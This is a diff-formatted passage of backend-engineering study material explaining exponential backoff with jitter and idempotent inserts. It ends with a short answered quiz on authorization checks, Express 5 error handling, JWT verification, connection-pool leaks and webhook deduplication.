+<x-simple>After failure n, wait about base × 2^n (with a cap), usually randomised (jitter). The growth gives a struggling dependency time to recover instead of being hammered; the cap bounds worst-case delay; jitter prevents synchronized retry waves when many clients failed at the same moment. It’s used in TCP, cloud SDKs and job queues (BullMQ’s exponential backoff).</x-simple>
+<x-eg>base 500 ms → 500, 1000, 2000, 4000 ms (capped at 8000); with full jitter each wait is random between 0 and that value.</x-eg>
+<x-fu q="What is “decorrelated jitter”?">Each delay is random between base and 3 × previous delay (capped): spreads retries well and avoids long fixed waits.</x-fu>
+<x-no>“Backoff means waiting the same time between retries” (that’s fixed delay).</x-no>
+<x-ev>Retry basics.</x-ev></x-q>
+
+<x-q n="3.70" tag="must solid"><x-t>How would you prevent duplicate requests from creating duplicate records?</x-t>
+<x-say>Idempotency keys stored under a unique constraint, natural unique constraints (e.g. one course per user + request key), upserts (<code>ON CONFLICT</code>), and disabling double submits in the UI. Rely on the database constraint, not a check-then-insert.</x-say>
+<x-simple>Duplicates come from double clicks, client retries after timeouts, queue redelivery and concurrent requests. Layers: the UI disables the button while pending; the client sends an idempotency key per logical action; the server stores (user, key) with a unique constraint and replays the stored response; natural unique keys (user + file hash, course + lesson number) block duplicates even without keys; inserts use <code>ON CONFLICT</code> instead of check-then-insert, because two concurrent checks can both see “not found”.</x-simple>
+<x-code><pre data-l="sql">INSERT INTO lessons (course_id, module_no, lesson_no, body) VALUES ($1, $2, $3, $4)
+ON CONFLICT (course_id, module_no, lesson_no) DO NOTHING;</pre></x-code>
+<x-fu q="How long do you keep idempotency keys?">Long enough to cover client retry windows (often 24 h), then expire them with a cleanup job.</x-fu>
+<x-no>“SELECT first, then INSERT if missing.” That races.</x-no>
+<x-ev>Practical reliability.</x-ev></x-q>
+
+<h2 class="sec"><span class="k">✓</span>Checkpoint</h2>
+<x-quiz id="qz-p03">
+<x-mcq a="1"><x-t>A user changes <code>/documents/41</code> to <code>/documents/42</code> and sees another user’s file. They were logged in. What’s missing?</x-t><x-o>Authentication</x-o><x-o>Authorization (ownership check in the query)</x-o><x-o>CORS</x-o><x-o>Rate limiting</x-o><x-why>They were authenticated. The query must include <code>AND user_id = $2</code>.</x-why></x-mcq>
+<x-mcq a="2"><x-t>Express 5: an async handler throws. What happens?</x-t><x-o>The process crashes</x-o><x-o>The request hangs</x-o><x-o>The rejection is forwarded to the error-handling middleware</x-o><x-o>Express retries the handler</x-o><x-why>Express 5 forwards rejected promises to next(err). Express 4 needed a wrapper.</x-why></x-mcq>
+<x-mcq a="0"><x-t>Which status for “document is still being processed, try later”?</x-t><x-o>409 Conflict</x-o><x-o>404 Not Found</x-o><x-o>500</x-o><x-o>401</x-o><x-why>The request conflicts with the resource’s current state.</x-why></x-mcq>
+<x-mcq a="3"><x-t>What does <code>jwt.decode()</code> check?</x-t><x-o>Signature</x-o><x-o>Expiry</x-o><x-o>Both</x-o><x-o>Nothing; it only reads the payload</x-o><x-why>Always use verify() with a pinned algorithm.</x-why></x-mcq>
+<x-mcq a="1"><x-t>Your pool has max 10 connections and every request hangs after an hour. Most likely?</x-t><x-o>Postgres is down</x-o><x-o>A code path doesn’t release checked-out clients</x-o><x-o>The JWT secret changed</x-o><x-o>CORS</x-o><x-why>Leaked clients: always release in finally.</x-why></x-mcq>
+<x-mcq a="2"><x-t>Webhook delivered twice. Best defence?</x-t><x-o>Ignore webhooks</x-o><x-o>Process twice and fix later</x-o><x-o>Store event ids with a unique constraint and skip duplicates</x-o><x-o>Return 500 the second time</x-o><x-why>Senders retry by design. Dedupe on the event id.</x-why></x-mcq>
+</x-quiz>
